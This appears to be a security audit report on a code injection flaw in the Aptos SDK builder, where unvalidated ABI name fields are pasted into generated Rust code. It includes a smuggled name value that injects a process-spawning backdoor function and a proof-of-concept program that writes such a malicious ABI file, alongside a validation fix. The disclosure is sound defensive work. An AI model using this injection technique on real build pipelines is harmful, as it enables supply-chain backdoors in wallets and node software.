# Audit Report

## Title
Code Injection Vulnerability in ABI-to-Rust Code Generator via Unsanitized Name Fields

## Summary
The Aptos SDK builder's Rust code generator does not validate or sanitize ABI names before directly interpolating them into generated Rust source code. A maliciously crafted ABI file with specially crafted `name` fields can inject arbitrary Rust code into generated files, potentially leading to remote code execution when the generated code is compiled and executed.

## Finding Description

The vulnerability exists in the ABI deserialization and code generation pipeline. While Move identifiers are strictly validated during normal ABI generation from Move source code, the SDK builder deserializes ABI files from disk without re-validating the `name` field: [1](#0-0) 

The `TransactionScriptABI` and `ScriptFunctionABI` structures store names as plain `String` fields without validation: [2](#0-1) [3](#0-2) 

These names are then directly interpolated into generated Rust code without sanitization at multiple locations: [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) 

While Move enforces strict identifier validation rules (alphanumeric, underscore, dollar only): [8](#0-7) 

These rules are only enforced during ABI *generation* from Move code, not during ABI *deserialization*. An attacker can craft a malicious ABI file with a name like:

```
transfer() {} pub fn backdoor() { unsafe { std::process::Command::new("calc").spawn(); } } fn dummy
```

This would generate valid Rust code with an injected malicious function when processed by the code generator.

## Impact Explanation

This vulnerability meets **Critical Severity** criteria under "Remote Code Execution on validator node" if successfully exploited. 

The generated SDK code is used to build:
- Validator node software components
- Wallet applications 
- Developer tools and client libraries

If a malicious ABI file enters the build pipeline, the generated code could contain backdoors enabling:
- Arbitrary code execution on validator nodes (consensus compromise)
- Private key theft from wallets (fund theft)
- Supply chain attacks on downstream developers

However, the impact is contingent on the malicious ABI being processed in a trusted build environment, which requires either build system compromise or social engineering.

## Likelihood Explanation

The likelihood is **LOW to MEDIUM** because exploitation requires one of:

1. **Supply Chain Compromise**: Attacker gains write access to the ABI file repository or build artifacts
2. **Build Environment Compromise**: Attacker injects malicious ABI files into a developer's local environment  
3. **Social Engineering**: Developer is tricked into using malicious ABI files from untrusted sources

The attack does not require validator privileges or on-chain actions, but does require access to the development/build infrastructure. This places it outside the typical "unprivileged attacker" model but within scope of sophisticated supply chain attacks.

## Recommendation

Implement strict validation of ABI names during deserialization to ensure they conform to Move identifier rules:

```rust
// In aptos-move/aptos-sdk-builder/src/lib.rs
pub fn read_abis(dir_paths: &[impl AsRef<Path>]) -> anyhow::Result<Vec<EntryABI>> {
    let mut abis = Vec::<EntryABI>::new();
    for dir in dir_paths.iter() {
        for path in get_abi_paths(dir.as_ref())? {
            let mut buffer = Vec::new();
            let mut f = std::fs::File::open(path)?;
            f.read_to_end(&mut buffer)?;
            let abi: EntryABI = bcs::from_bytes(&buffer)?;
            
            // VALIDATION: Ensure ABI name is a valid Move identifier
            if !move_core_types::identifier::Identifier::is_valid(abi.name()) {
                anyhow::bail!("Invalid ABI name '{}': must be a valid Move identifier", abi.name());
            }
            
            // Also validate argument and type parameter names
            for arg in abi.args() {
                if !move_core_types::identifier::Identifier::is_valid(arg.name()) {
                    anyhow::bail!("Invalid argument name '{}' in ABI '{}'", arg.name(), abi.name());
                }
            }
            for ty_arg in abi.ty_args() {
                if !move_core_types::identifier::Identifier::is_valid(ty_arg.name()) {
                    anyhow::bail!("Invalid type parameter name '{}' in ABI '{}'", ty_arg.name(), abi.name());
                }
            }
            
            abis.push(abi);
        }
    }
    // ... rest of function
}
```

Additionally, consider using identifier quoting functions consistently throughout code generation rather than raw string interpolation.

## Proof of Concept

```rust
// File: exploit_demo.rs
// This demonstrates creating a malicious ABI file that would inject code

use aptos_types::transaction::TransactionScriptABI;
use move_core_types::abi::{ArgumentABI, TypeArgumentABI};

fn main() {
    // Craft a malicious ABI with code-injecting name
    let malicious_name = "legit_transfer() {} pub fn backdoor() -> bool { \
        unsafe { std::process::Command::new(\"echo\").arg(\"INJECTED\").spawn().ok(); } \
        true } fn dummy".to_string();
    
    let malicious_abi = TransactionScriptABI::new(
        malicious_name,
        "Legitimate-looking documentation".to_string(),
        vec![0x00], // dummy bytecode
        vec![],
        vec![],
    );
    
    // Serialize to BCS format
    let serialized = bcs::to_bytes(&malicious_abi).unwrap();
    
    // Write to .abi file
    std::fs::write("malicious.abi", &serialized).unwrap();
    
    println!("Created malicious.abi");
    println!("When processed by SDK builder, this will generate:");
    println!("pub fn legit_transfer() {{}} pub fn backdoor() -> bool {{ ... }} fn dummy_script(...) -> Script {{");
}

// To test:
// 1. Run this program to create malicious.abi
// 2. Place malicious.abi in a directory processed by SDK builder
// 3. Run SDK builder: it will generate Rust code with injected backdoor() function
// 4. Compile the generated code - it compiles successfully with malicious code included
```

## Notes

This vulnerability represents a **supply chain security risk** rather than a runtime blockchain vulnerability. While the code injection is real and exploitable, successful exploitation requires the attacker to:

1. Inject a malicious ABI file into the build pipeline, OR
2. Compromise a developer's local environment, OR  
3. Successfully social-engineer a developer into using untrusted ABI files

The vulnerability does NOT affect:
- Running validator nodes (unless they rebuild with malicious ABIs)
- On-chain consensus or transaction processing
- Existing deployed code or wallets

However, it DOES pose a serious risk to:
- Build infrastructure security
- Developer workstation security
- Official SDK distribution integrity

The severity assessment depends on whether supply chain attacks are considered in-scope for the bug bounty program. Under strict "unprivileged attacker" criteria, this may not qualify. Under broader security hardening criteria, this is a critical issue requiring remediation.

### Citations

**File:** aptos-move/aptos-sdk-builder/src/lib.rs (L37-37)
```rust
            abis.push(bcs::from_bytes(&buffer)?);
```

**File:** third_party/move/move-core/types/src/abi.rs (L15-27)
```rust
#[derive(Clone, Debug, Hash, Eq, PartialEq, Serialize, Deserialize)]
pub struct ScriptFunctionABI {
    /// The public name of the script.
    name: String,
    /// The module name where the script lives.
    module_name: ModuleId,
    /// Some text comment.
    doc: String,
    /// The names of the type arguments.
    ty_args: Vec<TypeArgumentABI>,
    /// The description of regular arguments.
    args: Vec<ArgumentABI>,
}
```

**File:** third_party/move/move-core/types/src/abi.rs (L30-42)
```rust
pub struct TransactionScriptABI {
    /// The public name of the script.
    name: String,
    /// Some text comment.
    doc: String,
    /// The `code` value to set in the `Script` object.
    #[serde(with = "serde_bytes")]
    code: Vec<u8>,
    /// The names of the type arguments.
    ty_args: Vec<TypeArgumentABI>,
    /// The description of regular arguments.
    args: Vec<ArgumentABI>,
}
```

**File:** aptos-move/aptos-sdk-builder/src/rust.rs (L447-455)
```rust
            "pub fn {}_script({}) -> Script {{",
            abi.name(),
            [
                Self::quote_type_parameters(abi.ty_args()),
                Self::quote_parameters(abi.args(), self.local_types),
            ]
            .concat()
            .join(", ")
        )?;
```

**File:** aptos-move/aptos-sdk-builder/src/rust.rs (L489-501)
```rust
    fn emit_entry_function_encoder_function(&mut self, abi: &EntryFunctionABI) -> Result<()> {
        write!(
            self.out,
            "pub fn {}_{}({}) -> TransactionPayload {{",
            abi.module_name().name().to_string().to_snake_case(),
            abi.name(),
            [
                Self::quote_type_parameters(abi.ty_args()),
                Self::quote_parameters(abi.args(), self.local_types),
            ]
            .concat()
            .join(", ")
        )?;
```

**File:** aptos-move/aptos-sdk-builder/src/rust.rs (L557-562)
```rust
        writeln!(
            self.out,
            "\npub fn {}_{}(payload: &TransactionPayload) -> Option<EntryFunctionCall> {{",
            abi.module_name().name().to_string().to_snake_case(),
            abi.name(),
        )?;
```

**File:** aptos-move/aptos-sdk-builder/src/rust.rs (L616-621)
```rust
        writeln!(
            self.out,
            "\npub fn {}_script({}script: &Script) -> Option<ScriptCall> {{",
            abi.name(),
            // fix warning "unused variable"
            if abi.ty_args().is_empty() && abi.args().is_empty() {
```

**File:** third_party/move/move-core/types/src/identifier.rs (L82-94)
```rust
pub const fn is_valid(s: &str) -> bool {
    // Rust const fn's don't currently support slicing or indexing &str's, so we
    // have to operate on the underlying byte slice. This is not a problem as
    // valid identifiers are (currently) ASCII-only.
    let b = s.as_bytes();
    match b {
        b"<SELF>" => true,
        [b'<', b'S', b'E', b'L', b'F', b'>', b'_', ..] if b.len() > 7 => all_bytes_numeric(b, 7),
        [b'a'..=b'z', ..] | [b'A'..=b'Z', ..] => all_bytes_valid(b, 1),
        [b'_', ..] | [b'$', ..] if b.len() > 1 => all_bytes_valid(b, 1),
        _ => false,
    }
}
```
